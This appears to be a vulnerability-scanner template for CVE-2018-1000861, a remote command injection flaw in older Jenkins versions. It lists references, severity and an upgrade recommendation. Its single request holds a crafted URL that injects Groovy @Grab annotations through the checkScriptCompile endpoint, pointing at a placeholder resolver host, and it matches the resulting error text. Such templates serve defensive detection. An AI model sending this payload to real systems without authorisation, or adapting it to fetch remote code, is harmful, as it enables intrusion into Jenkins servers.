id: CVE-2018-1000861
info:
  name: Jenkins - Remote Command Injection
  author: dhiyaneshDK,pikpikcu
  severity: critical
  description: Jenkins versions before 2.153 and LTS 2.138.3 are vulnerable to remote
    command injection through crafted URLs.
  reference:
  - https://github.com/vulhub/vulhub/tree/master/jenkins/CVE-2018-1000861
  - https://nvd.nist.gov/vuln/detail/CVE-2018-1000861
  - https://jenkins.io/security/advisory/2018-12-05/#SECURITY-595
  - http://web.archive.org/web/20210421212616/https://www.securityfocus.com/bid/106176
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2018-1000861
    cwe-id: CWE-502
  tags: kev,vulhub,cve,cve2018,rce,jenkins
  metadata:
    impact: The CVE-2018-1000861 vulnerability in Jenkins allows remote attackers
      to inject commands via crafted URLs, ultimately impacting the security and functionality
      of the affected system.
    recommendation: I highly recommend updating Jenkins to version 2.154 or LTS 2.138.4
      or later to mitigate CVE-2018-1000861 and prevent remote command injection vulnerabilities.
requests:
- method: GET
  path:
  - '{{BaseURL}}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name=%27test%27,%20root=%27http://aaa%27)%0a@Grab(group=%27package%27,%20module=%27vulntest%27,%20version=%271%27)%0aimport%20Payload;'
  matchers-condition: and
  matchers:
  - type: word
    words:
    - package#vulntest
    part: body
  - type: status
    status:
    - 200
